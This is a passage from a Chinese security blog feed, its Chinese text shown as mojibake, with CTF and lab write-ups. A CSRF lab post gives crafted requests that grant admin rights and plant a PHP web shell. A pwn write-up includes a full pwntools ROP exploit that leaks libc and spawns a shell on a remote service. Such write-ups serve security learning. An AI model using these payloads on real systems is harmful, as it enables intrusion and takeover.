        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRFï¼ˆCross-site request forgeryè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œOne Click Attackâ€æˆ–è€…Session Ridingï¼Œé€šå¸¸ç¼©å†™ä¸ºCSRFæˆ–è€…XSRFï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚</p><h2 id="ä¸XSSçš„åŒºåˆ«"><a href="#ä¸XSSçš„åŒºåˆ«" class="headerlink" title="ä¸XSSçš„åŒºåˆ«"></a>ä¸XSSçš„åŒºåˆ«</h2><p>è™½ç„¶æˆ‘ä¸æ‡‚XSSï¼Œä½†æ˜¯æˆ‘å¤§æ¦‚è¿˜æ˜¯çŸ¥é“ä¸€ç‚¹XSSä¸­çš„æ”»å‡»æµç¨‹ï¼Œä¸XSSä¸åŒçš„æ˜¯CSRFåœ¨æ”»å‡»çš„æ—¶å€™ï¼Œæ”»å‡»ä»£ç æ˜¯ç”±ç®¡ç†å‘˜æ‰§è¡Œçš„ã€‚</p><p>æ•´ä¸ªCSRFæ”»å‡»æµç¨‹æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»è€…å‘ç°CSRFæ¼æ´â€”â€”æ„é€ ä»£ç â€”â€”å‘é€ç»™å—å®³äººâ€”â€”å—å®³äººæ‰“å¼€â€”â€”å—å®³äººæ‰§è¡Œä»£ç â€”â€”å®Œæˆæ”»å‡»</span><br></pre></td></tr></table></figure><h2 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h2><p>åœ¨éº¦é¦™å¸ˆå‚…å®¶ï¼Œç”¨éº¦é¦™å¸ˆå‚…çš„æ­çš„ç¯å¢ƒï¼Œä½“éªŒäº†ä¸€ä¸ªå‚»é€¼ç®¡ç†å‘˜å¦‚ä½•è¢«æ”»å‡»çš„è¿‡ç¨‹ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆè·å–äº†timekeyï¼Œå³æ—¶é—´æˆ³ï¼Œè¿˜æœ‰tokenã€‚<br>ç»è¿‡ç²¾å¿ƒçš„æ„é€ ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ï¼Œä¸€ä¸ªå°†è‡ªå·±çš„å¸å·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„çš„æ”»å‡»ä»£ç ï¼Œåœ¨è¿™ä¸ªå®éªŒç¯å¢ƒå”¯ä¸€çš„ä¸è¶³å°±æ˜¯ä¸çŸ¥é“å¦‚ä½•è·å–è‡ªå·±çš„id numenberã€‚<br><strong>æ„é€ çš„ä»£ç å¦‚ä¸‹</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload/index.php?g=admin&amp;c=admin&amp;a=assign_admin_do&amp;admin_role_id=1&amp;a_ac_id%5B%5D=_all&amp;timeKey=1481717211&amp;token=a50d7be4&amp;member_id=5</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç çš„ä½œç”¨æ˜¯å°†æŒ‡å®šçš„è´¦æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ã€‚</p><p>å½“æˆ‘ä»¬è·å–ç®¡ç†å‘˜æƒé™ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•getshellï¼Œè¿™æ¬¡æˆ‘ä»¬ä¾æ—§æ˜¯å¯ä»¥é€šè¿‡CSRFï¼Œå½“ç®¡ç†å‘˜ç‚¹å‡»æˆ‘ä»¬æ„é€ å¥½çš„ä»£ç åï¼Œæˆ‘ä»¬æ‰€å†™çš„ä¸€å¥è¯å°±è¢«å†™å…¥äº†ã€‚</p><p>è¿™ä¸ªå®éªŒæœ‰ä¸€ä¸ªä¸è¶³çš„åœ°æ–¹å°±æ˜¯ï¼Œä¸çŸ¥é“ä¸€å¥è¯è¢«å†™å…¥çš„ä½ç½®ï¼Œå…¶æ¬¡å¥½åƒå› ä¸ºæ˜¯ç»„ä»¶çš„åŸå› ï¼Œå¦‚æœæˆ‘ä»¬ä¸€æ¬¡æ²¡å†™å…¥æˆåŠŸï¼Œè¿™ä¸ªç»„ä»¶å°±åæ‰äº†ï¼Œå¹¶ä¸èƒ½ç¬¬äºŒæ¬¡å†™å…¥ã€‚åœ¨ä»Šå¤©æ™šä¸Šçš„å®éªŒè¿‡ç¨‹ä¸­ï¼Œå¹¶æ²¡èƒ½æˆåŠŸgetsehllï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»£ç çš„åŸå› ã€‚<strong>æˆ‘çš„ä»£ç å¦‚ä¸‹ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/upload/index.php?g=admin&amp;c=template&amp;a=edit_template_file_do&amp;file=add_report.php&amp;description=æ·»åŠ æŠ¥å‘Š&amp;content=&lt;script language=pHp&gt;<span class="variable">$a</span> = chr(<span class="string">&quot;97&quot;</span>).ssert;<span class="variable">$a</span>(<span class="variable">$_POST</span>[k]);&lt;/script&gt;&lt;&amp;timeKey=1481719767&amp;token=9d1547ba&amp;template=default&amp;dir=*home</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç æ˜¯æœªç»è¿‡urlç¼–ç çš„ï¼Œä½†æ˜¯åœ¨å®éªŒçš„è¿‡ç¨‹ä¸­ï¼Œè™½ç„¶ä¸€å¥è¯æ²¡å†™å…¥ï¼Œä½†æ˜¯ä¸‹é¢çš„ä»£ç å´æˆåŠŸå†™å…¥phpinfoäº†ã€‚<br><strong>phpinfoå†™å…¥ä»£ç </strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload/index.php?g=admin&amp;c=template&amp;a=edit_template_file_do&amp;file=add_report.php&amp;description=%E6%B7%BB%E5%8A%A0%E6%8A%A5%E5%91%8A&amp;content=%3C%3Fphp+phpinfo%28%29%3F%3E%3C&amp;timeKey=1481717211&amp;token=a50d7be4&amp;template=default&amp;dir=*home</span><br></pre></td></tr></table></figure><h2 id="å¿ƒå¾—"><a href="#å¿ƒå¾—" class="headerlink" title="å¿ƒå¾—"></a>å¿ƒå¾—</h2><p>CSRFæœ€å…³é”®çš„æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯äººä¸äººä¹‹é—´çš„åšå¼ˆï¼Œå…³é”®æ˜¯å¦‚ä½•è®©ç®¡ç†å‘˜æˆåŠŸæ‰§è¡Œæˆ‘ä»¬çš„æ”»å‡»ä»£ç å‘¢ï¼Ÿè¿™çš„ç¡®æ˜¯ä¸€ä¸ªå€¼å¾—æ€è€ƒçš„é—®é¢˜ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">æµ…è°ˆCSRFæ”»å‡»æ–¹å¼</a><br><a href="http://www.freebuf.com/articles/web/55965.html">ä»é›¶å¼€å§‹å­¦CSRF</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiuç™¾åº¦æ¯-åä¸€æœˆreverseä¸“é¢˜</title>
      <link href="ichuqiu-reverse-November.html"/>
      <url>ichuqiu-reverse-November.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Miscå†…å®¹å¤ªç®€å•ä¸è¯´äº†ï¼Œç›´æ¥è¿›å…¥æ­£é¢˜</p><h2 id="CrackMe-1"><a href="#CrackMe-1" class="headerlink" title="CrackMe 1"></a>CrackMe 1</h2><p>ç¬¬ä¸€ä¸ªé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œ  é¢˜ç›®æ˜¯ç›´æ¥é€šè¿‡å–æ–‡æœ¬æ¶ˆæ¯æœºåˆ¶å®Œæˆï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æ‰¾åˆ°å…³é”®çš„æ¶ˆæ¯å°±å¥½äº†</p><p>æˆ‘ä»¬æœ€ç»ˆèƒ½æ‰¾åˆ°ä¸€ä¸ªå«DefWindowProcWçš„APIï¼Œè¿›å»åæˆ‘ä»¬ä¼šå‘ç°</p><p>![CrackMe][1]</p><p>  ä¼šå‘ç°ä¹‹ç±»æœ‰ä¸€ä¸ªå¾ªç¯çš„å¼‚æˆ–ä»¥åŠæ–‡æœ¬ç»˜åˆ¶ï¼Œåè€…æ˜¯å‰è€…çš„ç»“æœã€‚</p><p>  æˆ‘ä»¬å¯ä»¥çŸ¥é“Chtextçš„å¤§æ¦‚å†…å®¹</p><p>[Cmd-Markdown.exe](./_attachment/Cmd Markdown.exe)  ![æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°][2]</p><p>  ä½†æ˜¯åœ¨å¼‚æˆ–çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“v6çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çˆ†ç ´ï¼Œå› ä¸ºæ˜¯å•å­—èŠ‚çš„å¼‚æˆ–è¿™é‡Œå¥½åŠï¼Œåªè¦çˆ†ç ´åçš„ç»“æœæœ‰flagå°±æ˜¯æˆ‘ä»¬è¦çš„ç­”æ¡ˆäº†ã€‚</p><h2 id="CrackMe2"><a href="#CrackMe2" class="headerlink" title="CrackMe2"></a>CrackMe2</h2><p>  ç¬¬äºŒé¢˜æŒºè®©äººå¤´å¤§çš„ï¼Œæˆ‘ä¸€å¼€å§‹å› ä¸ºæ˜¯ç®€å•çš„AESåŠ è§£å¯†ï¼Œåæ¥å±…ç„¶æ˜¯ä¸ªè¿·å®«ã€‚ã€‚ã€‚éƒ½å¿«åè¡€äº†ã€‚</p><p>  å¤§æ¦‚é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨getdlgltemtextAä¸‹æ–­ç‚¹ï¼Œä¹‹åå‘ç°ç¨‹åºé€»è¾‘æ˜¯ï¼š<br>  å…ˆè·å–å†…å®¹åˆ¤æ–­æ˜¯å¦ä¸ºç©ºï¼Œç„¶åä»¥16è¿›åˆ¶çš„å½¢å¼ä¿å­˜ï¼Œç„¶åè¿›å…¥åˆ°ä¸€ä¸ªAESè§£å¯†çš„åœ°æ–¹<br>  ![AES][3]<br>  ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°AESçš„å¯†é’¥æ˜¯B1nGzL[4st-TeAm]</p><p>  AESè§£å¯†ä¹‹ååˆè¿›è¡Œäº†ä¸€æ®µbase64çš„è§£ç ï¼Œç„¶åèˆå»å¶æ•°ä½åªå–å¥‡æ•°ï¼Œå¹¶ä¸”å…¶Asciiç å€¼ä¸èƒ½å¤§äº83(S)<br>  ä¹‹åæ˜¯æŸ¥è¡¨è·³è½¬ï¼Œç´§æ¥ç€æ˜¯è¿˜æœ‰çš„ä¸€å¤§å †æ“ä½œ å…ˆè·³è¿‡<br> åˆ°æœ€åæˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªè¿·å®«ï¼Œæ­£ç¡®è·¯å¾„çš„é€‰æ‹©æ˜¯27S281S182S327S287S323Q124S281S1<br> ä½†æ˜¯æ­£æ˜¯å› ä¸ºå¦‚æœå¶æ•°ä¸º0x30æ˜¯ä¸è¿›è¡Œå¾ªç¯çš„ï¼Œæ˜¯å¯èƒ½äº§ç”Ÿå¤šè§£çš„ã€‚</p><h2 id="CrackMe3"><a href="#CrackMe3" class="headerlink" title="CrackMe3"></a>CrackMe3</h2><p> ç¬¬ä¸‰ä¸ªæ˜¯ä¸ªå¼€å…³ç¯æ¸¸æˆï¼Œä¸€ç›´è§‰å¾—å’Œ52ç ´è§£çš„æŸä¸ªé¢˜ç›®ç‰¹åˆ«åƒï¼Œå…·ä½“æƒ³ä¸èµ·æ¥æ˜¯å“ªä¸ªé¢˜ç›®äº†ã€‚<br>â€‹<br>è¿™ä¸ªé¢˜ç›®ä¹Ÿäº§ç”Ÿå¤šè§£äº†ï¼Œ<br>å…ˆæ˜¯è®¡ç®—å¸¸é‡b1ngzlçš„é•¿åº¦ï¼Œç„¶åå†è®¡ç®—è¾“å…¥é•¿åº¦ï¼Œç„¶åå°†ä¸¤ä¸ªé•¿åº¦çš„å€¼ä¸4å¼‚æˆ–ï¼Œ<br>ç„¶åå†™å…¥5<em>9</em>9ä¸ªdwordï¼Œè¿›è¡Œäº†9*9 81ä¸ªå¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯æŒ‰è§„åˆ™å†™å…¥5ä¸ªdwordï¼Œäº§ç”Ÿäº†5ä¸ªæ•°ç»„æˆ–è€…è¯´çŸ©é˜µï¼Ÿ</p><p>å°±è¿™æ ·å§ åæ­£è¿™ä¸ªé¢˜ç›®å¤šè§£æ¯”ç¬¬äºŒè¿˜å¤šã€‚ã€‚ã€‚ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-01.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqi-reverse-nov-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqi-reverse-nov-02.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-reverse-nov-03.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> iæ˜¥ç§‹-ç™¾åº¦æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› Re400</title>
      <link href="Second%20Shanghai%20college%20students%20&#39;%20network%20security%20competition.html"/>
      <url>Second%20Shanghai%20college%20students%20&#39;%20network%20security%20competition.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ç”¨æŸ¥æ‰¾å…³é”®å­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œå¾ˆå®¹æ˜“å°±æ‰¾åˆ°äº†mainå‡½æ•°<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-01.jpg"></a></p><p>ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯checkä¸€ä¸‹è¾“å…¥çš„å‡½æ•°ï¼Œæ­£ç¡®å°±Righté”™è¯¯ï¼Œ<br> æˆ‘ä»¬è¿›å…¥åˆ°<strong>sub_401510</strong>å‡½æ•°é‡Œé¢</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-02.jpg"></a></p><p>å…ˆæ˜¯åˆ¤æ–­å­—ç¬¦ä¸èƒ½ä¸ºéå­—æ¯éæ•°å­—<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-04.jpg"></a></p><p>å†å–è¾“å…¥çš„å­—ç¬¦ä¸²çš„å‰5ä½ä¸ºkey ä½œDESçš„å¯†é’¥<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddctf-oline-05.jpg"></a></p><p>ä¹‹åå†åšbase64ç¼–ç <br>ä¸æœ€åmainå‡½æ•°é‡Œçš„chekcæ¯”è¾ƒ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddcff-oline-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-ddcff-oline-06.jpg"></a></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åšä¸ªæš´åŠ›ç ´è§£</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> ä¸Šæµ·çœèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016-SUCTF-PWN-Writeup</title>
      <link href="2016-SUCTF-Writeup-pwn.html"/>
      <url>2016-SUCTF-Writeup-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>é¢˜ç›®æˆ‘å·²ç»æ‰“åŒ…å¥½äº†æ”¾åœ¨ç™¾åº¦äº‘<br><a href="http://pan.baidu.com/s/1pL6gMZh">é“¾æ¥</a></p><h1 id="è¿™æ˜¯ä½ çš„hello-pwn"><a href="#è¿™æ˜¯ä½ çš„hello-pwn" class="headerlink" title="è¿™æ˜¯ä½ çš„hello pwn"></a>è¿™æ˜¯ä½ çš„hello pwn</h1><p>è¿™é¢˜æ˜¯ä¸€ä¸ªåŸºç¡€é¢˜ï¼Œï¼Œåªè¦ç»•è¿‡checkï¼Œè¾“å…¥key - - â€˜zhimakaimenâ€™ï¼Œå°±å¯ä»¥ç»§ç»­è¾“å…¥payloadï¼Œç„¶åè¦†ç›–åˆ°åˆ°å…³é”®å‡½æ•°</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-01.jpg"></a></p><p>å°±èƒ½å¾—åˆ°flagäº†</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-02.jpg"></a></p><h1 id="å†æ¥ä¸€å‘"><a href="#å†æ¥ä¸€å‘" class="headerlink" title="å†æ¥ä¸€å‘"></a>å†æ¥ä¸€å‘</h1><p>è¿™ä¸ªé¢˜ç›®æ¯”ä¸Šä¸ªé¢˜ç›®å·®åœ¨äº†ä¸€ä¸ªåœ°æ–¹ï¼Œä¸Šä¸ªé¢˜ç›®çš„getflagï¼Œæ˜¯èƒ½ç›´æ¥getflagçš„ï¼Œç„¶è€Œè¿™ä¸ªé¢˜ç›®getflagæ˜¯è°ƒç”¨äº†systemï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨è°ƒç”¨äº†systemä¹‹åï¼Œå¯ä»¥åœ¨bssæ®µå†™å…¥/bin/shèµ·shell</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-03.jpg"></a></p><h1 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h1><p>æˆ‘æœ¬æ¥åœ¨è¿™ä¸ªé¢˜ç›®å¡ä½äº†æ¥ç€ï¼Œåœ¨jokerå¸ˆå‚…çš„æ•™å¯¼ä¸‹å­¦ä¹ äº†ä¸€ä¸‹mmapçš„å‡½æ•°çš„åˆ©ç”¨ã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/25929931.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/25929931.jpg"></a><br>åˆ†æçš„æ—¶å€™å‘ç°è¿™ä¸ªç¨‹åºæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€ä¸‹mmapå‡½æ•°ã€‚<br>mmapå‡½æ•°å¯ä»¥åˆ†å‡ºä¸€æ®µå†…å­˜ï¼Œè¿™æ–­å†…å­˜çš„æ•°æ®æ˜¯å¯æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†shellcodeå†™å…¥è¿™æ®µå†…å­˜ï¼Œç„¶åå»getshell<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/7110208.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/7110208.jpg"></a></p><h1 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h1><p>è¿™ä¸ªé¢˜ç›®çš„æ€è·¯æ˜¯é€šè¿‡DynELFå»leak  systemå‡½æ•°åœ°å€ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡å†™å…¥/bin/shèµ·shell</p><p>è¿™ä¸ªé¢˜ç›®åªæ¯”pwn200å¤šäº†ä¸€ä¸ªleak  sysytemå‡½æ•°çš„æ­¥éª¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = remote(&quot;106.75.84.74&quot;, 10001)#pwn</span></span><br><span class="line">r = remote(<span class="string">&quot;23.106.148.10&quot;</span>,<span class="number">20000</span>)<span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwnme&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">write_plt = <span class="number">0x00000000004004B0</span></span><br><span class="line">read_plt = <span class="number">0x00000000004004D0</span></span><br><span class="line">main = <span class="number">0x0000000004005F6</span></span><br><span class="line">bss = <span class="number">0x000000000600a70</span> + <span class="number">0x100</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006c3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x00000000004006c1</span></span><br><span class="line"><span class="comment">#rdx === 0x100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop_r15_ret)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(<span class="number">0x6161616161616161</span>)</span><br><span class="line">    payload += p64(write_plt)</span><br><span class="line">    payload += p64(main)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    data = r.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./simple&#x27;</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] system addr:&#123;0&#125;&quot;</span>.format(hex(system_addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">0x6161616161616161</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½œä¸ºä¸€ä¸ªäºŒè¿›åˆ¶å®‰å…¨å­¦ä¹ è€…å¿…çŸ¥å¿…è¯»çš„ä¹¦ç±æ¨è</title>
      <link href="As-a-Software%20security%20engineer-must-know-and-read-books-recommended.html"/>
      <url>As-a-Software%20security%20engineer-must-know-and-read-books-recommended.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è«åå…¶å¦™æ¥äº†ä¸€ä¸ªæ•´ç†äºŒè¿›åˆ¶å®‰å…¨ä¹¦ç±çš„æ´»ï¼Œæœ¬æ¥æ˜¯<code>4ido10n </code>è¡¨å“¥åœ¨æ•´ç†webå®‰å…¨ç›¸å…³çš„ä¹¦ç±ï¼Œç„¶åä»–æ‰¾æˆ‘è¦æ¨èï¼Œæˆ‘è«åå…¶å¦™ç»™ä»–äº†äºŒè¿›åˆ¶å®‰å…¨çš„ä¹¦ã€‚æœ‰ç‚¹å°´å°¬é˜¿ï¼Œäºæ˜¯ä¹ï¼Œæˆ‘å°±é¡ºä¾¿åšè¿™ä»¶äº‹æƒ…äº†<br>ï¼ˆæŠ„è¢­ä¸€ä¸‹ï¼‰<br>è‡³äºä¹¦ç±æ¨èè¿™ä¸ªè¯é¢˜ï¼Œå¾ˆå¤šå‰è¾ˆéƒ½å›ç­”è¿‡äº†ï¼Œä½†è¿˜æ˜¯æœ‰å¾ˆå¤šåˆšå…¥é—¨çš„å°ä¼™ä¼´è¿˜æ˜¯ä¸€è¨€ä¸åˆå°±é—®æ”¹çœ‹ä¹¦ç±ï¼Œä½œä¸ºä¸€ä¸ªè¿˜åœ¨å­¦ä¹ çš„èœé¸Ÿå¿ æ³å‘Šè¯‰ä½ ï¼Œä½ 